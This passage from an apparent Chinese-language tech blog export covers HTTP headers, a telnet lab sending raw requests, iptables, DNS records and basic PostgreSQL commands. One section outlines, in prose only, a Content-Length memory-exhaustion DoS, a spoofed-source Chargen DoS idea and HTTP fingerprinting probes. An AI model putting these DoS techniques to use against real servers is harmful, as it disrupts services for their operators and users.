<li>application/x-www-form-urlencoded ： <form enctype="””">中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</form></li>
<li>另外一种常见的媒体格式是上传文件之时使用的：</li>
</ul>
<p>​                multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p>
<p>以上就是我们在日常的开发中，经常会用到的若干content-type的内容格式。</p>
<p>Accept<br>Accept请求报头域用于指定客户端接受哪些类型的信息。eg：Accept：image/gif，表明客户端希望接受GIF图象格式的资源；Accept：text/html，表明客户端希望接受html文本。</p>
<p>Accept-Charset<br>Accept-Charset请求报头域用于指定客户端接受的字符集。例：Accept-Charset:iso-8859-1,gb2312.如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。</p>
<p>Accept-Encoding<br>Accept-Encoding请求报头域类似于Accept，但是它是用于指定可接受的内容编码。例：Accept-Encoding:gzip.deflate.如果请求消息中没有设置这个域服务器假定客户端对各种内容编码都可以接受。</p>
<p>Accept-Language<br>Accept-Language请求报头域类似于Accept，但是它是用于指定一种<a href="http://lib.csdn.net/base/nlp" target="_blank" rel="noopener">自然语言</a>。例：Accept-Language:zh-cn.如果请求消息中没有设置这个报头域，服务器假定客户端对各种语言都可以接受。</p>
<p>Authorization<br>Authorization请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为401（未授权），可以发送一个包含Authorization请求报头域的请求，要求服务器对其进行验证。</p>
<p>Host（发送请求时，该报头域是必需的）<br>Host请求报头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的，</p>
<p>例：<br>我们在浏览器中输入：<a href="http://www.guet.edu.cn/index.html" target="_blank" rel="noopener">http://www.guet.edu.cn/index.html</a><br>浏览器发送的请求消息中，就会包含Host请求报头域，如下：<br>Host：<a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">www.guet.edu.cn</a><br>此处使用缺省端口号80，若指定了端口号，则变成：Host：<a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">www.guet.edu.cn</a>:指定端口号</p>
<p>User-Agent</p>
<p>我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的<a href="http://lib.csdn.net/base/operatingsystem" target="_blank" rel="noopener">操作系统</a>的名称和版本，你所使用的浏览器的名称和版本，这往往让很多人感到很神奇，实际上，服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息。User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。不过，这个报头域不是必需的，如果我们自己编写一个浏览器，不使用User-Agent请求报头域，那么服务器端就无法得知我们的信息了。</p>
<p>请求报头举例：<br><img src="http://img.blog.csdn.net/20160203151910953" alt="img"></p>
<p>3、响应报头</p>
<p>响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URI所标识的资源进行下一步访问的信息。<br>常用的响应报头<br>Location<br>Location响应报头域用于重定向接受者到一个新的位置。Location响应报头域常用在更换域名的时候。<br>Server<br>Server响应报头域包含了服务器用来处理请求的软件信息。与User-Agent请求报头域是相对应的。下面是<br>Server响应报头域的一个例子：Server：Apache-Coyote/1.1WWW-AuthenticateWWW-Authenticate响应报头域必须被包含在401（未授权的）响应消息中，客户端收到401响应消息时候，并发送Authorization报头域请求服务器对其进行验证时，服务端响应报头就包含该报头域。例：WWW-Authenticate:Basic realm=”Basic Auth Test!”  //可以看出服务器对请求资源采用的是基本验证机制。</p>
<p>4、实体报头</p>
<p>请求和响应消息都可以传送一个实体。一个实体由实体报头域和实体正文组成，但并不是说实体报头域和实体正文要在一起发送，可以只发送实体报头域。实体报头定义了关于实体正文（eg：有无实体正文）和请求所标识的资源的元信息。<br>常用的实体报头<br>Content-Encoding<br>Content-Encoding实体报头域被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。Content-Encoding这样用于记录文档的压缩方法，例：Content-Encoding：gzip</p>
<p>Content-Language<br>Content-Language实体报头域描述了资源所用的自然语言。没有设置该域则认为实体内容将提供给所有的语言阅读<br>者。例：Content-Language:da</p>
<p>Content-Length<br>Content-Length实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字来表示。</p>
<p>Content-Type<br>Content-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。例：<br>Content-Type:text/html;charset=ISO-8859-1<br>Content-Type:text/html;charset=GB2312</p>
<p>Last-Modified<br>Last-Modified实体报头域用于指示资源的最后修改日期和时间。</p>
<p>Expires<br>Expires实体报头域给出响应过期的日期和时间。为了让代理服务器或浏览器在一段时间以后更新缓存中(再次访问曾访问过的页面时，直接从缓存中加载，缩短响应时间和降低服务器负载)的页面，我们可以使用Expires实体报头域指定页面过期的时间。eg：Expires：Thu，15 Sep 2006 16:23:12 GMT</p>
<p>HTTP1.1的客户端和缓存必须将其他非法的日期格式（包括0）看作已经过期。eg：为了让浏览器不要缓存页面，我们也可以利用Expires实体报头域，设置为0，jsp中程序如下：response.setDateHeader(“Expires”,”0”);</p>
<h4 id="利用telnet观察http协议的通讯过程"><a href="#利用telnet观察http协议的通讯过程" class="headerlink" title="利用telnet观察http协议的通讯过程"></a><strong>利用telnet观察http协议的通讯过程</strong></h4><p>​    实验目的及原理：<br>​    利用MS的telnet工具，通过手动输入http请求信息的方式，向服务器发出请求，服务器接收、解释和接受请求后，会返回一个响应，该响应会在telnet窗口上显示出来，从而从感性上加深对http协议的通讯过程的认识。</p>
<p>​    实验步骤：</p>
<p>1、打开telnet<br>1.1 打开telnet<br>运行–&gt;cmd–&gt;telnet</p>
<p>1.2 打开telnet回显功能<br>set localecho</p>
<p>2、连接服务器并发送请求<br>2.1 open <a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">www.guet.edu.cn</a> 80  //注意端口号不能省略</p>
<p>​    HEAD /index.asp HTTP/1.0<br>​    Host:<a href="http://www.guet.edu.cn" target="_blank" rel="noopener">www.guet.edu.cn</a><br>​<br>   /<em>我们可以变换请求方法,请求桂林电子主页内容,输入消息如下</em>/<br>​    open <a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">www.guet.edu.cn</a> 80 </p>
<p>​    GET /index.asp HTTP/1.0  //请求资源的内容<br>​    Host:<a href="http://www.guet.edu.cn" target="_blank" rel="noopener">www.guet.edu.cn</a>  </p>
<p>2.2 open <a href="http://www.sina.com.cn/" target="_blank" rel="noopener">www.sina.com.cn</a> 80  //在命令提示符号下直接输入telnet <a href="http://www.sina.com.cn/" target="_blank" rel="noopener">www.sina.com.cn</a> 80<br>    HEAD /index.asp HTTP/1.0<br>    Host:<a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a></p>
<p>3 实验结果：</p>
<p>3.1 请求信息2.1得到的响应是:</p>
<p>HTTP/1.1 200 OK                                              //请求成功<br>Server: Microsoft-IIS/5.0                                    //web服务器<br>Date: Thu,08 Mar 200707:17:51 GMT<br>Connection: Keep-Alive<br>Content-Length: 23330<br>Content-Type: text/html<br>Expries: Thu,08 Mar 2007 07:16:51 GMT<br>Set-Cookie: ASPSESSIONIDQAQBQQQB=BEJCDGKADEDJKLKKAJEOIMMH; path=/<br>Cache-control: private</p>
<p>//资源内容省略</p>
<p>3.2 请求信息2.2得到的响应是:</p>
<p>HTTP/1.0 404 Not Found       //请求失败<br>Date: Thu, 08 Mar 2007 07:50:50 GMT<br>Server: Apache/2.0.54 <unix><br>Last-Modified: Thu, 30 Nov 2006 11:35:41 GMT<br>ETag: “6277a-415-e7c76980”<br>Accept-Ranges: bytes<br>X-Powered-By: mod_xlayout_jh/0.0.1vhs.markII.remix<br>Vary: Accept-Encoding<br>Content-Type: text/html<br>X-Cache: MISS from zjm152-78.sina.com.cn<br>Via: 1.0 zjm152-78.sina.com.cn:80&lt;squid/2.6.STABLES-20061207&gt;<br>X-Cache: MISS from th-143.sina.com.cn<br>Connection: close</unix></p>
<p>失去了跟主机的连接</p>
<p>按任意键继续…</p>
<p>4 .注意事项：1、出现输入错误，则请求不会成功。<br>          2、报头域不分大小写。<br>          3、更深一步了解HTTP协议，可以查看RFC2616，在<a href="http://www.letf.org/rfc" target="_blank" rel="noopener">http://www.letf.org/rfc</a>上找到该文件。<br>          4、开发后台程序必须掌握http协议</p>
<h4 id="HTTP协议相关技术补充"><a href="#HTTP协议相关技术补充" class="headerlink" title="HTTP协议相关技术补充"></a><strong>HTTP协议相关技术补充</strong></h4><p>​    1、基础：</p>
<p>​    高层协议有：文件传输协议FTP、电子邮件传输协议SMTP、域名系统服务DNS、网络新闻传输协议NNTP和HTTP协议等<br>中介由三种：代理(Proxy)、网关(Gateway)和通道(Tunnel)，一个代理根据URI的绝对格式来接受请求，重写全部或部分消息，通过 URI的标识把已格式化过的请求发送到服务器。网关是一个接收代理，作为一些其它服务器的上层，并且如果必须的话，可以把请求翻译给下层的服务器协议。一 个通道作为不改变消息的两个连接之间的中继点。当通讯需要通过一个中介(例如：防火墙等)或者是中介不能识别消息的内容时，通道经常被使用。<br>​     代理(Proxy)：一个中间程序，它可以充当一个服务器，也可以充当一个客户机，为其它客户机建立请求。请求是通过可能的翻译在内部或经过传递到其它的 服务器中。一个代理在发送请求信息之前，必须解释并且如果可能重写它。代理经常作为通过防火墙的客户机端的门户，代理还可以作为一个帮助应用来通过协议处 理没有被用户代理完成的请求。<br>网关(Gateway)：一个作为其它服务器中间媒介的服务器。与代理不同的是，网关接受请求就好象对被请求的资源来说它就是源服务器；发出请求的客户机并没有意识到它在同网关打交道。<br>网关经常作为通过防火墙的服务器端的门户，网关还可以作为一个协议翻译器以便存取那些存储在非HTTP系统中的资源。<br>​    通道(Tunnel)：是作为两个连接中继的中介程序。一旦激活，通道便被认为不属于HTTP通讯，尽管通道可能是被一个HTTP请求初始化的。当被中继 的连接两端关闭时，通道便消失。当一个门户(Portal)必须存在或中介(Intermediary)不能解释中继的通讯时通道被经常使用。</p>
<p>2、协议分析的优势—HTTP分析器检测网络攻击</p>
<p>以模块化的方式对高层协议进行分析处理，将是未来入侵检测的方向。<br>HTTP及其代理的常用端口80、3128和8080在network部分用port标签进行了规定</p>
<p>3、HTTP协议Content Lenth限制漏洞导致拒绝服务攻击</p>
<p>使用POST方法时，可以设置ContentLenth来定义需要传送的数据长度，例如ContentLenth:999999999，在传送完成前，内 存不会释放，攻击者可以利用这个缺陷，连续向WEB服务器发送垃圾数据直至WEB服务器内存耗尽。这种攻击方法基本不会留下痕迹。<br><a href="http://www.cnpaf[.NET](http://lib.csdn.net/base/dotnet)/Class/HTTP/0532918532667330.html" target="_blank" rel="noopener">http://www.cnpaf[.NET](http://lib.csdn.net/base/dotnet)/Class/HTTP/0532918532667330.html</a></p>
<p>4、利用HTTP协议的特性进行拒绝服务攻击的一些构思</p>
<p>服务器端忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了SYNFlood攻击（SYN洪水攻击）。<br>而Smurf、TearDrop等是利用ICMP报文来Flood和IP碎片攻击的。本文用“正常连接”的方法来产生拒绝服务攻击。<br>19端口在早期已经有人用来做Chargen攻击了，即Chargen_Denial_of_Service，但是！他们用的方法是在两台Chargen 服务器之间产生UDP连接，让服务器处理过多信息而DOWN掉，那么，干掉一台WEB服务器的条件就必须有2个：1.有Chargen服务2.有HTTP 服务<br>方法：攻击者伪造源IP给N台Chargen发送连接请求（Connect），Chargen接收到连接后就会返回每秒72字节的字符流（实际上根据网络实际情况，这个速度更快）给服务器。</p>
<p>5、Http指纹识别技术</p>
<p>   Http指纹识别的原理大致上也是相同的：记录不同服务器对Http协议执行中的微小差别进行识别.Http指纹识别比TCP/IP堆栈指纹识别复杂许 多,理由是定制Http服务器的配置文件、增加插件或组件使得更改Http的响应信息变的很容易,这样使得识别变的困难；然而定制TCP/IP堆栈的行为 需要对核心层进行修改,所以就容易识别.<br>      要让服务器返回不同的Banner信息的设置是很简单的,象Apache这样的开放源代码的Http服务器,用户可以在源代码里修改Banner信息,然 后重起Http服务就生效了；对于没有公开源代码的Http服务器比如微软的IIS或者是Netscape,可以在存放Banner信息的Dll文件中修 改,相关的文章有讨论的,这里不再赘述,当然这样的修改的效果还是不错的.另外一种模糊Banner信息的方法是使用插件。<br>常用测试请求：<br>1：HEAD/Http/1.0发送基本的Http请求<br>2：DELETE/Http/1.0发送那些不被允许的请求,比如Delete请求</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables原理详解</title>
    <url>/articles/1652fdb7.html</url>
    <content><![CDATA[<h2 id="iptables简介"><a href="#iptables简介" class="headerlink" title="iptables简介"></a><strong>iptables简介</strong></h2><p>netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案。它工作在网络层，针对TCP/IP数据包实施过滤和限制，是典型的包过滤防火墙；它也可以实现网络地址转换（NAT）等功能。</p>
<a id="more"></a>

<h4 id="iptables的优点"><a href="#iptables的优点" class="headerlink" title="iptables的优点"></a><strong>iptables的优点</strong></h4><p>netfilter/iptables的最大优点是它可以配置有状态的防火墙。有状态的防火墙能够指定并记住为发送或接收数据包所建立的连接状态。防火墙可以从数据包的连接跟踪状态获得该信息。在决定新的数据包过滤时，防火墙所使用的这些状态信息可以增加其效率和速度。有四种有效状态，分别为：ESTABLISHED (已建立的连接)、INVALID(非法或无法识别) 、NEW(已经或将启动新的连接)和RELATED(正在启动新连接)。另一个优点：用户可以完全自己控制防火墙配置和数据包过滤，也可以定制自己的规则来满足特定的需求，从而允许想要的网络流量进入</p>
<h4 id="iptables和netfilter关系"><a href="#iptables和netfilter关系" class="headerlink" title="iptables和netfilter关系"></a><strong>iptables和netfilter关系</strong></h4><p>netfilter和iptables通常都可以用来指的是Linux防火墙，但二者是有区别的，如：netfilter：是内核的一部分，指的是Linux内核中实现包过滤防火墙的内部结构，也称为”内核空间（kernelspace）”,不以程序或文件的形式而存在；iptables:指的是管理Linux防火墙的命令工具，也被称为”用户空间（userspace）”，程序通常位于/sbin/iptables，由用户直接使用，而我们经常使用的也就是iptables管理工具，而真正实现防火墙功能的是netfilter.</p>
<h4 id="iptables基础知识"><a href="#iptables基础知识" class="headerlink" title="iptables基础知识"></a><strong>iptables基础知识</strong></h4><p>规则(rules)也是就管理员定义的条件，规则一般的定义为”如果数据包符合定义的条件，就按规则处理这个数据包”，如果规则中没有定义就匹配默认的策略。规则是存储在内核空间的信息包过滤表中，这些规则分别定义了源地址、目标地址、传输协议(如TCP、ICMP、UDP)和服务类型(如HTTP、FTP、SMTP)等。当数据包与定义的规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如：允许(ACCEPT)、拒绝(REJECT)、丢弃(DROP)、目标地址转换(DNAT)、源地址转换(SNAT)、日志(LOG)等</p>
<h4 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a><strong>包过滤的工作层次</strong></h4><p>   主要是工作在网络层，针对IP数据包，在对数据包内的IP地址、端口、内容等处理上，如下图：</p>
<p><img src="/articles/1652fdb7/1.png" alt></p>
<h4 id="iptables传输数据包的过程"><a href="#iptables传输数据包的过程" class="headerlink" title="iptables传输数据包的过程"></a><strong>iptables传输数据包的过程</strong></h4><p>1、当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。<br>2、如果数据包就是进入本机的，它会经过路由选择到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。<br>3、如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。</p>
<p><img src="/articles/1652fdb7/2.png" alt></p>
<h4 id="iptables的规则链和表"><a href="#iptables的规则链和表" class="headerlink" title="iptables的规则链和表"></a><strong>iptables的规则链和表</strong></h4><p><strong>规则表（tables）：</strong></p>
<p>iptables内置了4个表， 规则表之间的优先顺序   RAW–MANGLE–NAT–FILTER</p>
<p>raw表：确定是否对数据包进行状态跟踪，些模块用的不是太多；内核模块：iptable_raw；包含两个链：OUTPUT、PREROUTING</p>
<p>mangle表:为数据包TOS(服务类型)、TTL(生命周期)值，或者为数据包设置标记，以实现流量整形等高级应用，内核模块：iptable_mangle；包含五个链：INPUT、OUTPUT、PREROUTING、POSTROUTING、FORWARD</p>
<p>nat表:实现网络地址转换(如：IP、端口)，修改数据包中的源、目标IP地址或端口；内核模块：iptable_nat；包含三个链：OUTPUT、POSTROUTING、PREROUTING</p>
<p>filter表:实现数据包过滤功能，内核模块：iptable_filter；包含三个链：INPUT、OUTPUT、FORWARD</p>
<p><strong>规则链（chains）：</strong></p>
<p>​     链是数据包传播的路径，每一条链其实就是众多规则中的一个检查列表，每一条链中可以有一条或多条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，检查该数据包是否满足规则所定义的条件。如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。默认有五种规则链：</p>
<p>INPUT: 处理进入的数据包</p>
<p>OUTPUT:处理出站的数据包</p>
<p>FORWARD:处理转发数据包</p>
<p>POSTROUTING:路由选择后处理数据包，做源地址转换</p>
<p>PREROUTING:路由选择前处理数据包，做目标地址转换</p>
<p>规则链之间匹配顺序分三种情况：</p>
<p><strong>第一种情况：入站数据流向</strong></p>
<p>   从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等），之后会进行路由选择（判断该数据包应该发往何处），如果数据包的目标主机是防火墙本机（比如说Internet用户访问防火墙主机中的web服务器的数据包），那么内核将其传给INPUT链进行处理（决定是否允许通过等），通过以后再交给系统上层的应用程序（比如HTTPD服务器）进行响应。</p>
<p><strong>第二冲情况：转发数据流向</strong><br>   来自外界的数据包到达防火墙后，首先被PREROUTING规则链处理，之后会进行路由选择，如果数据包的目标地址是其它外部地址（比如局域网用户通过网关访问QQ站点的数据包），则内核将其传递给FORWARD链进行处理（是否转发或拦截），然后再交给POSTROUTING规则链（是否修改数据包的地址等）进行处理。</p>
<p><strong>第三种情况：出站数据流向</strong><br>    防火墙本机向外部地址发送的数据包（比如在防火墙主机中测试公网DNS服务器时），首先被OUTPUT规则链处理，之后进行路由选择，然后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理。</p>
<p>   Iptables采用“表”和“链”的分层结构。下面罗列一下这四张表和五个链。注意一定要明白这些表和链的关系及作用。</p>
<p><img src="/articles/1652fdb7/3.png" alt></p>
<h4 id="管理和设置iptables"><a href="#管理和设置iptables" class="headerlink" title="管理和设置iptables"></a><strong>管理和设置iptables</strong></h4><p>iptables命令语法格式： iptables [-t 表名] 管理选项 [链名] [条件匹配] [-j 目标动作或跳转]</p>
<p>注释：如果不指定表名，默认表示filter表；如果不指定链名，默认表示该表的所有链；除非设置规则链的缺少策略，否则都要指定匹配条件</p>
<p><strong>目标：</strong></p>
<p>   DROP：丢弃</p>
<p>   REJECT：拒绝</p>
<p>   ACCEPT：允许</p>
<p>   RETURN：返回跳转</p>
<p>   REDIRECT：端口重定向</p>
<p>   DNAT：目标地址转换</p>
<p>   SNAT：源地址转换</p>
<p>   LOG：记录日志</p>
<p>   MARK：打标记</p>
<p><strong>iptables管理命令：</strong></p>
<table>
<thead>
<tr>
<th>选择表</th>
<th>-t</th>
<th>指定表</th>
</tr>
</thead>
<tbody><tr>
<td>添加新规则</td>
<td>-A</td>
<td>在链的最后追加一条规则</td>
</tr>
<tr>
<td></td>
<td>-I</td>
<td>在链的开头或指定序号插入一条规则</td>
</tr>
<tr>
<td></td>
<td>-x</td>
<td>显示精确值，不做单位换算</td>
</tr>
<tr>
<td>替换规则</td>
<td>-R</td>
<td>替换一条指定的规则</td>
</tr>
<tr>
<td>查看规则</td>
<td>-L</td>
<td>列出所有规则</td>
</tr>
<tr>
<td></td>
<td>-n</td>
<td>以数据形式显示地址与端口信息</td>
</tr>
<tr>
<td></td>
<td>-v</td>
<td>以更加详细的方式显示</td>
</tr>
<tr>
<td></td>
<td>–line-numbers</td>
<td>查看规则时，显示规则序号</td>
</tr>
<tr>
<td>删除或清空规则</td>
<td>-D</td>
<td>删除指定序号的一条规则</td>
</tr>
<tr>
<td></td>
<td>-F</td>
<td>清空指定表中的所有规则</td>
</tr>
<tr>
<td>设置默认策略</td>
<td>-P</td>
<td>为指定的链设置默认规则</td>
</tr>
<tr>
<td>新建规则链</td>
<td>-N</td>
<td>新建自定义链</td>
</tr>
<tr>
<td>重命名链</td>
<td>-E</td>
<td>重命名自定义链</td>
</tr>
<tr>
<td>删除链</td>
<td>-X</td>
<td>删除自定义空链</td>
</tr>
<tr>
<td></td>
<td>-Z</td>
<td>计数器清零</td>
</tr>
</tbody></table>
<p><img src="/articles/1652fdb7/4.png" alt></p>
<p><img src="/articles/1652fdb7/5.png" alt></p>
<p>   <strong>iptables的另外一机制:应用规则和删除规则，具体操作和实现方法将在下一篇再详细介绍，敬请关注…</strong></p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS中的七大资源记录详解</title>
    <url>/articles/5136542c.html</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p> <strong>域名系统</strong>（<a href="https://baike.baidu.com/item/英文" target="_blank" rel="noopener">英文</a>：<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem，<a href="https://baike.baidu.com/item/缩写" target="_blank" rel="noopener">缩写</a>：<strong>DNS</strong>）是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>的一项服务。它作为将<a href="https://baike.baidu.com/item/域名" target="_blank" rel="noopener">域名</a>和<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>相互<a href="https://baike.baidu.com/item/映射" target="_blank" rel="noopener">映射</a>的一个<a href="https://baike.baidu.com/item/分布式数据库" target="_blank" rel="noopener">分布式数据库</a>，能够使人更方便地访问<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>。DNS使用<a href="https://baike.baidu.com/item/TCP" target="_blank" rel="noopener">TCP</a>和<a href="https://baike.baidu.com/item/UDP" target="_blank" rel="noopener">UDP</a><a href="https://baike.baidu.com/item/端口" target="_blank" rel="noopener">端口</a>53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p>
<p><img src="/articles/5136542c/1.jpg" alt></p>
<p>DNS分为正向查找区域和反向查找区域，然后在分为，主要，辅助，存根区域，在这些区域里，又存在着很多的记录，今天，就让我们来看看这些记录。</p>
<a id="more"></a>

<h2 id="记录详解"><a href="#记录详解" class="headerlink" title="记录详解"></a>记录详解</h2><h4 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a><strong>A记录</strong></h4><p>A记录也称为主机记录，是使用最广泛的DNS记录，A记录的基本作用就是说明一个域名对应的IP是多少，   它是域名和IP地址的对应关系，表现形式为     <a href="http://www.contoso.com/" target="_blank" rel="noopener">www.contoso.com</a>   192.168.1.1  这就是一个A记录！A记录除了进行域名IP对应以外，还有一个高级用法，可以作为低成本的负载均衡的解决方案，比如说，<a href="http://www.contoso.com/" target="_blank" rel="noopener">www.contoso.com</a>  可以创建多个A记录，对应多台物理服务器的IP地址，可以实现基本的流量均衡！</p>
<h4 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a><strong>NS记录</strong></h4><p>  NS记录和SOA记录是任何一个DNS区域都不可或缺的两条记录，NS记录也叫名称服务器记录，用于说明这个区域有哪些DNS服务器负责解析，SOA记录说明负责解析的DNS服务器中哪一个是主服务器。因此，任何一个DNS区域都不可能缺少这两条记录。NS记录，说明了在这个区域里，有多少个服务器来承担解析的任务。</p>
<h4 id="SOA记录"><a href="#SOA记录" class="headerlink" title="SOA记录"></a><strong>SOA记录</strong></h4><p>  NS记录说明了有多台服务器在进行解析，但哪一个才是主服务器呢，NS并没有说明，这个就要看SOA记录了，SOA名叫起始授权机构记录，SOA记录说明了在众多NS记录里那一台才是主要的服务器！</p>
<h4 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a><strong>MX记录</strong></h4><p>  全称是邮件交换记录，在使用邮件服务器的时候，MX记录是无可或缺的，比如A用户向B用户发送一封邮件，那么他需要向ＤＮＳ查询Ｂ的MX记录，DNS在定位到了B的MX记录后反馈给A用户，然后Ａ用户把邮件投递到B用户的ＭＸ记录服务器里！</p>
<h4 id="Cname记录"><a href="#Cname记录" class="headerlink" title="Cname记录"></a><strong>Cname记录</strong></h4><p>  又叫别名记录，我们可以这么理解，我们小的时候都会有一个小名，长大了都是学名，那么正规来说学名的符合公安系统的，那个小名只是我们的一个代名词而已，这也存在一个好处，就是比暴漏自己，比如一个网站a.com 在发布的时候，他可以建立一个别名记录，把B.com发不出去，这样不容易被外在用户所察觉！达到隐藏自己的目的！</p>
<h4 id="SRV记录"><a href="#SRV记录" class="headerlink" title="SRV记录"></a><strong>SRV记录</strong></h4><p>  SRV记录是服务器资源记录的缩写，SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。那么SRV记录有什么用呢？SRV记录的作用是说明一个服务器能够提供什么样的服务！SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！表现形式为：<br>—ldap._tcp.contoso.com 600 IN SRV 0 100 389 NS.contoso.com<br>ladp: 是一个服务，该标识说明把这台服务器当做响应LDAP请求的服务器<br>tcp：本服务使用的协议，可以是tcp，也可以是用户数据包协议《udp》<br>contoso.com：此记录所值的域名<br>600： 此记录默认生存时间（秒）<br>IN： 标准DNS Internet类<br>SRV：将这条记录标识为SRV记录<br>0： 优先级，如果相同的服务有多条SRV记录，用户会尝试先连接优先级最低的记录<br>100：负载平衡机制，多条SRV并且优先级也相同，那么用户会先尝试连接权重高的记录<br>389：此服务使用的端口<br>NS.contoso.com:提供此服务的主机</p>
<h4 id="PTR记录"><a href="#PTR记录" class="headerlink" title="PTR记录"></a><strong>PTR记录</strong></h4><p>PTR记录也被称为指针记录，PTR记录是A记录的逆向记录，作用是把IP地址解析为域名。由于我们在前面提到过，DNS的反向区域负责从IP到域名的解析，因此如果要创建PTR记录，必须在反向区域中创建。<br>以上只是一些简单的介绍，并特别说明了SRV记录的格式，如果掌握了这些为以后的AD管理会有很大的帮助！<br>有说的不对的地方还请指教，没说到位的，还请补充！谢谢！</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Dns</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL基本命令</title>
    <url>/articles/6d5035d1.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文介绍了Postgresql数据库的常用用法，方便你正确的用库。</p>
<a id="more"></a>

<h2 id="用法详解"><a href="#用法详解" class="headerlink" title="用法详解"></a>用法详解</h2><h3 id="启动pgsl数据库"><a href="#启动pgsl数据库" class="headerlink" title="启动pgsl数据库"></a>启动pgsl数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pg_ctl -D /xx/pgdata  start</span><br></pre></td></tr></table></figure>

<h3 id="查看pgsl版本"><a href="#查看pgsl版本" class="headerlink" title="查看pgsl版本"></a>查看pgsl版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pg_ctl --version</span><br></pre></td></tr></table></figure>

<h3 id="命令行登录数据库"><a href="#命令行登录数据库" class="headerlink" title="命令行登录数据库"></a>命令行登录数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`psql -U username -d dbname -h hostip -p port`</span><br></pre></td></tr></table></figure>

<h3 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure>

<h3 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`\c dbname`</span><br></pre></td></tr></table></figure>

<h3 id="列出当前数据库的所有表"><a href="#列出当前数据库的所有表" class="headerlink" title="列出当前数据库的所有表"></a>列出当前数据库的所有表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>

<h3 id="查看指定表的所有字段"><a href="#查看指定表的所有字段" class="headerlink" title="查看指定表的所有字段"></a>查看指定表的所有字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`\d  tablename`</span><br></pre></td></tr></table></figure>

<p><img src="/articles/6d5035d1/1.png" alt="img"></p>
<h3 id="查看指定表的基本情况"><a href="#查看指定表的基本情况" class="headerlink" title="查看指定表的基本情况"></a>查看指定表的基本情况</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`\d+  tablename`</span><br></pre></td></tr></table></figure>

<p><img src="/articles/6d5035d1/2.png" alt="img"></p>
<h3 id="退出操作"><a href="#退出操作" class="headerlink" title="退出操作"></a>退出操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`q`</span><br></pre></td></tr></table></figure>

<h3 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h3><p>例1（主键）</p>
